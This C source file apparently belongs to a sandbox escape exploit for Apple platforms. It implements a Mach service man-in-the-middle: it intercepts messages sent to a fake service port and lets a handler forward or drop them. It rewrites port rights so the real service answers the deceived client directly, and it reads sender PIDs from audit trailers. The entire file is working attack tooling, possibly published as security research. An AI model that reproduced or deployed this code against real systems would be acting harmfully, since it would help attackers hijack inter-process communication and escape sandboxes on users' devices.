#include "sandbox_escape/mach_service_mitm.h"

#include "log/log.h"
#include "sandbox_escape/mach_message.h"

// ---- Mach MITM server --------------------------------------------------------------------------

// Translate a right type sent in a Mach message so that the port is sent along to the destination.
static mach_msg_type_name_t
mach_mitm_forward_right_type(mach_msg_type_name_t right_type) {
	switch (right_type) {
		case MACH_MSG_TYPE_PORT_RECEIVE:   return MACH_MSG_TYPE_MOVE_RECEIVE;
		case MACH_MSG_TYPE_PORT_SEND:      return MACH_MSG_TYPE_MOVE_SEND;
		case MACH_MSG_TYPE_PORT_SEND_ONCE: return MACH_MSG_TYPE_MOVE_SEND_ONCE;
		default:                           return 0;
	}
}

// Translate a descriptor sent in a Mach message so that all resources are sent along to the
// destination.
static mach_msg_type_descriptor_t *
mach_mitm_forward_descriptor(mach_msg_type_descriptor_t *descriptor) {
	mach_msg_descriptor_t *d = (mach_msg_descriptor_t *)descriptor;
	void *next = descriptor + 1;
	switch (d->type.type) {
		case MACH_MSG_PORT_DESCRIPTOR:
			d->port.disposition = mach_mitm_forward_right_type(d->port.disposition);
			next = &d->port + 1;
			break;
		case MACH_MSG_OOL_DESCRIPTOR:
		case MACH_MSG_OOL_VOLATILE_DESCRIPTOR:
			d->out_of_line.deallocate = 1;
			next = &d->out_of_line + 1;
			break;
		case MACH_MSG_OOL_PORTS_DESCRIPTOR:
			d->ool_ports.deallocate = 1;
			d->ool_ports.disposition = mach_mitm_forward_right_type(d->ool_ports.disposition);
			next = &d->ool_ports + 1;
			break;
	}
	return next;
}

// Process an inbound message on our fake service port so that it can be sent over to the real
// service port.
static void
mach_mitm_modify_for_forwarding(mach_msg_header_t *msg, mach_port_t real_service) {
	// Modify the message so that the service will reply directly to the client. We can't
	// actually fool the service into thinking that we have the UID/PID/etc. of the true client
	// because the audit token (set by the kernel) will tell them who we are, but we will fool
	// the client into thinking they're talking with the true service.
	mach_msg_type_name_t client_remote_right  = MACH_MSGH_BITS_REMOTE(msg->msgh_bits);
	mach_msg_type_name_t client_voucher_right = MACH_MSGH_BITS_VOUCHER(msg->msgh_bits);
	mach_msg_bits_t      other_bits           = MACH_MSGH_BITS_OTHER(msg->msgh_bits);
	bool                 is_complex           = MACH_MSGH_BITS_IS_COMPLEX(msg->msgh_bits);
	mach_port_t          client_port          = msg->msgh_remote_port;
	mach_msg_type_name_t new_remote_right     = MACH_MSG_TYPE_COPY_SEND;
	mach_msg_type_name_t new_local_right      = mach_mitm_forward_right_type(client_remote_right);
	mach_msg_type_name_t new_voucher_right    = mach_mitm_forward_right_type(client_voucher_right);
	msg->msgh_bits        = MACH_MSGH_BITS_SET(new_remote_right, new_local_right, new_voucher_right, other_bits);
	msg->msgh_remote_port = real_service;
	msg->msgh_local_port  = client_port;
	if (is_complex) {
		mach_msg_body_t *body = (mach_msg_body_t *)(msg + 1);
		mach_msg_type_descriptor_t *descriptor = (mach_msg_type_descriptor_t *)(body + 1);
		for (size_t i = 0; i < body->msgh_descriptor_count; i++) {
			descriptor = mach_mitm_forward_descriptor(descriptor);
		}
	}
}

bool
mach_mitm_server_once(mach_port_t real_service, mach_port_t fake_service,
		mach_mitm_server_message_handler_t handle_message) {
	return mach_receive_message(fake_service, MACH_MSG_TIMEOUT_NONE,
			^(mach_msg_header_t *msg) {
		// Create a reply struct in case sending doesn't work.
		mig_reply_error_t error_reply = {};
		mach_mig_create_error(msg, &error_reply, KERN_FAILURE);
		// Pass the message to the handler function. This function will indicate whether
		// we should forward the message or abort the connection.
		bool forward = handle_message(msg);
		// If we should forward the message, try to do so.
		bool sent = false;
		if (forward) {
			DEBUG_TRACE(2, "Forwarding message 0x%x", msg->msgh_id);
			mach_mitm_modify_for_forwarding(msg, real_service);
			sent = mach_send_message(msg);
		}
		// If we haven't sent the message (either because the message handler told us not
		// to or because the send to failed), send an error reply to the client.
		if (!sent) {
			sent = mach_send_message(&error_reply.Head);
			// Note that the error reply message consumes the remote port in the
			// original message, so we don't want to free that again.
			if (sent) {
				msg->msgh_remote_port = MACH_PORT_NULL;
			}
			mach_msg_destroy(msg);
		}
	});
}

void
mach_mitm_server(mach_port_t real_service, mach_port_t fake_service,
		mach_mitm_server_message_handler_t handle_message) {
	bool ok;
	do {
		ok = mach_mitm_server_once(real_service, fake_service, handle_message);
	} while (ok);
}

// ---- Mach message inspection -------------------------------------------------------------------

// Inspect all the Mach ports in a Mach message descriptor.
static mach_msg_type_descriptor_t *
mach_descriptor_inspect_ports(mach_msg_type_descriptor_t *descriptor,
		bool (^inspect_port)(mach_port_t)) {
	mach_msg_descriptor_t *d = (mach_msg_descriptor_t *)descriptor;
	mach_port_t port;
	void *next = descriptor + 1;
	switch (d->type.type) {
		case MACH_MSG_PORT_DESCRIPTOR:
			port = d->port.name;
			if (MACH_PORT_VALID(port)) {
				if (inspect_port(port)) {
					return NULL;
				}
			}
			next = &d->port + 1;
			break;
		case MACH_MSG_OOL_DESCRIPTOR:
		case MACH_MSG_OOL_VOLATILE_DESCRIPTOR:
			next = &d->out_of_line + 1;
			break;
		case MACH_MSG_OOL_PORTS_DESCRIPTOR:
			next = &d->ool_ports + 1;
			mach_port_t *ports = (mach_port_t *)d->ool_ports.address;
			mach_port_t *end = ports + d->ool_ports.count;
			for (; ports < end; ports++) {
				port = *ports;
				if (MACH_PORT_VALID(port)) {
					if (inspect_port(port)) {
						return NULL;
					}
				}
			}
			break;
	}
	return next;
}

void
mach_message_inspect_ports(mach_msg_header_t *msg, bool (^inspect_port)(mach_port_t)) {
	if (MACH_PORT_VALID(msg->msgh_remote_port)) {
		if (inspect_port(msg->msgh_remote_port)) {
			return;
		}
	}
	if (MACH_MSGH_BITS_IS_COMPLEX(msg->msgh_bits)) {
		mach_msg_body_t *body = (mach_msg_body_t *)(msg + 1);
		mach_msg_type_descriptor_t *descriptor = (mach_msg_type_descriptor_t *)(body + 1);
		for (size_t i = 0; descriptor != NULL && i < body->msgh_descriptor_count; i++) {
			descriptor = mach_descriptor_inspect_ports(descriptor, inspect_port);
		}
	}
}

int
mach_message_get_pid(mach_msg_header_t *msg) {
	mach_msg_audit_trailer_t *trailer = (void *) ((uint8_t *)msg + msg->msgh_size);
	return trailer->msgh_audit.val[5];
}
